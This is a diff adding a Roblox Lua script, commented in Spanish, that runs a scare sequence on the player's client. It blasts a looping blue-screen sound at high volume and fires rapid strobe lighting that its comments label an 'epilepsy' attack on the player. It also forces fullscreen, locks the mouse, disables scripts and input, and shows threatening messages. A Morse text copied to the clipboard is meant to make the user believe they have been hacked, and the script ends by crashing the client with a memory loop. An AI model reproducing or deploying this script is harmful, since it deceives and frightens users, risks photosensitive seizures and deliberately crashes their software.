@@ -1,0 +1,496 @@
+--   insert crash sound   --
+local Sound_TT = Instance.new("Sound", game:GetService("Workspace"))
+
+---------------------------------------------------------------------------
+Sound_TT.Name = "TT_Sound"
+Sound_TT.PlaybackSpeed = 2
+Sound_TT.Volume = 20 --Max Volume to scare
+Sound_TT.SoundId = "rbxassetid://865599816" --blue screen [BSOD] windows 10 (By Phantom_FR)
+Sound_TT.Looped = true
+---------------------------------------------------------------------------
+--  Make functions For Script  --
+---------------------------------------------------------------------------
+--Sound--
+local SETSPEED = function(speed)
+if tonumber(speed) then
+	Sound_TT.PlaybackSpeed = tonumber(speed)
+end
+end
+local SETVOL = function(vol)
+if tonumber(vol) then
+	Sound_TT.Volume = tonumber(vol)
+end
+end
+local SOUNDTT = function()
+	Sound_TT:Play()
+end
+local STOP = function()
+	Sound_TT:Stop()
+end
+--crash--
+local crash_client = function()
+	if game["Run Service"]:IsStudio() or UserSettings().GameSettings:InStudioMode() then
+		print("Evitando crash en Studio")
+		return
+	end
+	print("Ejecutando crash_client()...")
+	while true do
+		table.insert({}, "Crash") -- Memory overload method
+	end
+end
+
+local stop_client_audios = function()
+	print("Deteniendo sonidos...") -- Para ver si entra en la función
+	for _, sound in ipairs(game.Workspace:GetChildren()) do
+		if sound:IsA("Sound") and sound.Name ~= "TT_Sound" then
+			print("Detenido:", sound.Name)
+			sound:Stop()
+			sound.Volume = 0
+		end
+	end
+	print("Detención completa")
+end
+
+
+local freeze_client = function()
+	local Players = game:GetService("Players")
+	local UserInputService = game:GetService("UserInputService")
+	local LocalPlayer = Players.LocalPlayer
+	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+
+	-- Detener animaciones y desactivar scripts locales
+	for _, obj in ipairs(game:GetDescendants()) do
+		if obj:IsA("LocalScript") and obj ~= script then print("disabling "..obj.Name.." from: "..obj:GetFullName()) obj.Disabled = true end
+		if obj:IsA("Animator") then for _, track in ipairs(obj:GetPlayingAnimationTracks()) do track:Stop() end end
+	end
+	
+	for _, obj in ipairs(game.CoreGui:GetDescendants()) do
+		if obj:IsA("LocalScript") and obj ~= script then print("COREGUI: disabling "..obj.Name.." from: "..obj:GetFullName()) obj.Disabled = true end
+	end
+	--bloquear el movimiento de la camara
+	local camera = workspace.CurrentCamera
+	camera.CameraType = Enum.CameraType.Scriptable
+	camera.CFrame = camera.CFrame -- Mantener la posición de la cámara en su lugar
+	
+	-- Inmovilizar jugadores
+	for _, player in ipairs(Players:GetPlayers()) do
+		local char = player.Character
+		local hum = char and char:FindFirstChildOfClass("Humanoid")
+		if hum then hum.WalkSpeed, hum.JumpPower, hum.AutoRotate = 0, 0, false end
+		Character.PrimaryPart.Anchored = true
+	end
+
+	-- Bloquear entrada del usuario
+	UserInputService.InputBegan:Connect(function(_, gp) if not gp then print("stopped try to use keyboard!")return true end end)
+end
+
+local epilepsy = false
+
+local  startEpilepsy = function()
+	epilepsy = true
+task.spawn(function()
+		while epilepsy do
+			-- Obtener el servicio de Lighting
+			local lighting = game:GetService("Lighting")
+
+			-- Crear efectos visuales
+			local colorEffect = Instance.new("ColorCorrectionEffect", lighting)
+			colorEffect.Saturation = math.random(-200, 200) / 100  -- Más saturación extrema
+			colorEffect.Brightness = math.random(-200, 200) / 100  -- Brillo más agresivo
+			colorEffect.Contrast = math.random(-100, 100) / 100  -- Contraste aleatorio
+
+			local bloomEffect = Instance.new("BloomEffect", lighting)
+			bloomEffect.Intensity = math.random(2, 20)  -- Aumenta el brillo
+			bloomEffect.Size = math.random(10, 56)
+
+			local blurEffect = Instance.new("BlurEffect", lighting)
+			blurEffect.Size = math.random(5, 30)  -- Más desenfoque
+
+			local sunRaysEffect = Instance.new("SunRaysEffect", lighting)
+			sunRaysEffect.Intensity = math.random(0, 1)  -- Brillos fuertes
+
+			-- Limpiar efectos después de 0.03 segundos para hacer cambios rápidos
+			game:GetService("Debris"):AddItem(colorEffect, 0.01)
+			game:GetService("Debris"):AddItem(bloomEffect, 0.01)
+			game:GetService("Debris"):AddItem(blurEffect, 0.01)
+			game:GetService("Debris"):AddItem(sunRaysEffect, 0.01)
+
+			-- Reducir el tiempo de espera para más intensidad
+			task.wait(0.01)
+		end
+
+end)
+end
+local stopEpilepsy = function()
+	if not epilepsy then return "¡already stopped!" end
+	epilepsy = false
+end
+
+local No_Escape = function()
+	--FullScreen Loop
+	task.spawn(function()
+		local UserInputService = game:GetService("UserInputService")
+		local LocalPlayer = game:GetService("Players").LocalPlayer
+
+		-- Verifica si el usuario está en PC
+		if not UserInputService.TouchEnabled and UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+			print("la computadora ha sido dectectada.")
+			local GuiService = game:GetService("GuiService")
+			local GameSettings = UserSettings().GameSettings
+
+			-- Función que fuerza el fullscreen si está desactivado
+			local function enforceFullscreen()
+				if not GameSettings:InFullScreen() then
+					GuiService:ToggleFullscreen()
+				end
+			end
+
+			-- Conectar la función al evento de cambio de configuración
+			GameSettings.Changed:Connect(function(property)
+				if property == "InFullScreen" then
+					enforceFullscreen()
+				end
+			end)
+
+			-- Ejecutar la función una vez al inicio por si el usuario ya está fuera de fullscreen
+			enforceFullscreen()
+		else
+			print("Usuario no está en PC")
+		end
+	end)
+	
+   task.spawn(function()
+		--Delete every Roblox GUI From CoreGui
+		for _, v in pairs(game.CoreGui:GetChildren()) do
+			if v:IsA("ScreenGui") then
+				v.Enabled = false
+			end
+		end
+
+   end)
+end
+
+local Morse_Code = function()
+
+local	GBDL_Text = [[--. ----- -... -... -.-- -.. ----- .-.. .-.. .- -. / -.- -. --- .-- ... / .-- .... . .-. . / -.-- --- ..- / .-.. .. ...- .]]
+
+return GBDL_Text
+end
+
+local generate_text = function(text)
+	if game:GetService("CoreGui"):FindFirstChild("CentroTextoGui") then
+		--si es dectectado, entonces eliminarlo
+		game:GetService("CoreGui").CentroTextoGui:Destroy()
+	end
+	if text == "del_text" then return end
+	-- Crea un ScreenGui si no existe
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.Name = "CentroTextoGui"
+	screenGui.Parent = game.CoreGui
+
+	-- Crea un TextLabel
+	local textoLabel = Instance.new("TextLabel")
+	textoLabel.Size = UDim2.new(0, 300, 0, 50)  -- Tamaño del texto
+	textoLabel.Position = UDim2.new(0.5, -150, 0.5, -25)  -- Centrado en la pantalla
+	textoLabel.Text = text
+	textoLabel.TextColor3 = Color3.fromRGB(0, 0, 0)  -- Color del texto (Negro)
+	textoLabel.TextSize = 19
+	textoLabel.TextScaled = false  -- Escalar el texto para que se ajuste al tamaño
+	textoLabel.BackgroundTransparency = 1  -- Sin fondo para el label
+	textoLabel.Parent = screenGui
+end
+
+local clipboard_TXT = function(txt)
+	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
+	if everyClipboard then
+		everyClipboard(tostring(txt))
+	else
+	end
+end
+
+local flash_BS = function()
+	local lighting = game:GetService("Lighting")
+
+task.spawn(function()
+		while true do
+			-- Crear un efecto de brillo oscuro para simular el flash negro
+			local blackout = Instance.new("ColorCorrectionEffect", lighting)
+blackout.TintColor = Color3.new(0, 0, 0)
+			-- Agregar el efecto y eliminarlo después de 0.1 segundos
+			game:GetService("Debris"):AddItem(blackout, 0.1)
+
+			-- Esperar 1 segundo antes del próximo parpadeo
+			task.wait(1)
+		end
+end)
+end
+
+local change_every_Text = function()
+for _, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
+if v:IsA("ScreenGui") then
+for _, va in pairs(v:GetDescendants()) do
+if va:IsA("TextLabel") or va:IsA("TextButton") then
+	task.spawn(function()
+	va.Text = Morse_Code()
+	end)
+end
+end
+end
+end
+end
+
+
+local runHelpMessages = false  -- Variable para controlar el loop
+local textMessages = {  -- Mensajes de ayuda aleatorios
+	"The miracle of birth.",
+	"a fetal fanfare.",
+	"鳥渡部だけが怖い。",
+	"これは何ですか",
+	"あなたは一日も早く死ぬでしょう。"
+}
+
+local function createHelpText()
+	local screenGui = game:GetService("CoreGui"):FindFirstChild("HelpMessagesGui")
+
+	if not screenGui then
+		screenGui = Instance.new("ScreenGui")
+		screenGui.Name = "HelpMessagesGui"
+		screenGui.Parent = game:GetService("CoreGui")
+	end
+
+	while runHelpMessages do
+		-- Crear un nuevo texto en pantalla
+		local textLabel = Instance.new("TextLabel")
+		textLabel.Size = UDim2.new(0, math.random(100, 200), 0, 30)  -- Tamaño aleatorio
+		textLabel.Position = UDim2.new(math.random(), 0, math.random(), 0)  -- Posición aleatoria
+		textLabel.Text = textMessages[math.random(1, #textMessages)]  -- Mensaje aleatorio
+		textLabel.TextColor3 = Color3.fromRGB(math.random(150, 255), 0, 0)  -- Rojo intenso
+		textLabel.TextTransparency = 0.7
+		textLabel.TextSize = math.random(15, 25)  -- Tamaño de texto aleatorio
+		textLabel.BackgroundTransparency = 1  -- Sin fondo
+		textLabel.Font = Enum.Font.GothamBlack  -- Fuente aterradora
+		textLabel.Parent = screenGui
+
+		-- Eliminar el mensaje después de un tiempo
+		game:GetService("Debris"):AddItem(textLabel, math.random(1, 3))
+
+		-- Esperar antes de crear otro
+		task.wait(0.1)
+	end
+end
+
+-- Función para activar/desactivar el loop
+local function toggleHelpMessages()
+	runHelpMessages = not runHelpMessages
+	if not runHelpMessages then
+		game.CoreGui:FindFirstChild("HelpMessagesGui"):Destroy()
+	end
+	if runHelpMessages then
+		task.spawn(createHelpText)
+	end
+end
+
+
+
+---------------------------------------------------------------------------
+
+local test = false
+print([[
+haciendo llamadas hacia:
+Morse_Code() y clipboard_TXT() --copia el codigo morse al portapapeles. el codigo en morse en si es un mensaje de "te veo" junto a la direccion IP del usuario. para simular que realmente alguien lo esta hackeando desde ese momento. es BRUTAL.
+stop_client_audios(20) --detiene cada audio para asi el sonido sea mas fuerte 
+startEpilepsy --comienza la epilepsia para atacar al jugador local]])
+-- start chaos --
+task.spawn(function()
+	local morse = Morse_Code()
+	print("Morse_Code() devolvió:", morse)
+	clipboard_TXT(morse)
+end)
+
+stop_client_audios()
+SOUNDTT()
+startEpilepsy()
+toggleHelpMessages()
+wait(test and 4 or 2)
+print([[
+haciendo llamadas hacia:
+stopEpilepsy()
+SETSPEED(20) --cambia la velocidad del audio
+No_Escape --impedir al usuario que se salga durante el caos.
+]])
+toggleHelpMessages()
+stopEpilepsy()
+SETSPEED(20)
+task.spawn(function()
+	local RunService = game:GetService"RunService" local UserInputService = game:GetService"UserInputService" RunService:BindToRenderStep("MouseLock",Enum.RenderPriority.Last.Value+1,function()     UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter end)
+end)
+
+task.spawn(function()
+	local UserInputService = game:GetService("UserInputService")
+
+	UserInputService.MouseIconEnabled = false
+end)
+freeze_client()
+change_every_Text()
+task.spawn(function()
+No_Escape()
+end)
+wait(test and 2 or 0.5)
+print([[
+haciendo llamadas hacia:
+generate_text() --asusta al usuario dejando un codigo morse parpadiante en la pantalla. si el usuario traduce este codigo, se topara con un mensaje diciendo que alguien lo vee junto a su direccion IP, lo que es demasiado fuerte y terrorifico debido a que el usuario piensa que realmente lo hackearon
+
+]])
+task.spawn(function()
+	generate_text(Morse_Code())
+	wait(test and 4 or 1)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+	wait(0.01)
+	generate_text("del_text")
+	wait(0.01)
+	generate_text(Morse_Code())
+end)
+wait(test and 4.3 or 1.3)
+print([[
+haciendo llamadas hacia:
+crash_client() -- simplemente crashea el roblox para generarle mas miedo al usuario y que tema por lo que paso. [lo mas proable es que simplemente se haya asustado]
+
+]])
+task.spawn(function()
+flash_BS()
+wait(1)
+	local function generateStrangeJapaneseText(part)
+		-- Asegúrate de que la parte sea válida
+		if not part:IsA("BasePart") then return end
+
+		-- Crear un SurfaceGui en la parte
+		local surfaceGui = Instance.new("SurfaceGui")
+		surfaceGui.Adornee = part
+		surfaceGui.Parent = part
+
+		-- Configuración de la SurfaceGui
+		surfaceGui.Face = Enum.NormalId.Front  -- La cara en la que aparecerá el texto
+
+		-- Crear un TextLabel para mostrar el texto
+		local textLabel = Instance.new("TextLabel")
+		textLabel.Parent = surfaceGui
+		textLabel.Size = UDim2.new(1, 0, 1, 0)
+		textLabel.Position = UDim2.new(0, 0, 0, 0)
+		textLabel.BackgroundTransparency = 1
+		textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+		textLabel.TextSize = 24
+		textLabel.TextScaled = true
+		textLabel.Font = Enum.Font.GothamBold
+		textLabel.TextTransparency = 0
+
+		-- Lista de palabras japonesas extrañas
+		local strangeJapaneseTexts = {
+			"死者の声",    -- "Voces de los muertos"
+			"本当の恐怖",  -- "Miedo real"
+			"私は消えました", -- "He desaparecido"
+			"目を開けて",   -- "Abre los ojos"
+			"誰も信じない", -- "Nadie lo cree"
+			"心の中の空虚", -- "Vacío en mi corazón"
+			"終わりは近い", -- "El final está cerca"
+			"見えないもの", -- "Lo invisible"
+			"過去に戻れ",   -- "Regresa al pasado"
+			"深淵に落ちる"  -- "Caer al abismo"
+		}
+
+		-- Seleccionar un texto aleatorio de la lista de palabras japonesas
+		local randomIndex = math.random(1, #strangeJapaneseTexts)
+		textLabel.Text = strangeJapaneseTexts[randomIndex]
+	end
+
+	-- Generar SurfaceGui con textos japoneses extraños en todas las partes del Workspace
+	for _, part in pairs(workspace:GetChildren()) do
+		generateStrangeJapaneseText(part)
+	end
+
+end)
+wait(test and 300 or 3)
+-- Crear un efecto de brillo oscuro para simular el flash negro
+local blackout = Instance.new("ColorCorrectionEffect", game.Lighting)
+blackout.TintColor = Color3.new(0, 0, 0)
+game:GetService("CoreGui").CentroTextoGui:FindFirstChildOfClass("TextLabel").TextColor3 = Color3.new(1, 1, 1) --hacer el codigo morse visible antes de crashear el cliente asi el codigo morse se queda en la pantalla hasta que el usuario cierre el roblox.
+wait(2)
+for _, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
+if v:IsA("ScreenGui") then
+v:Destroy()
+end
+end
+	wait()
+	
+crash_client()
+
+
+---------------------------------------------------------------------------
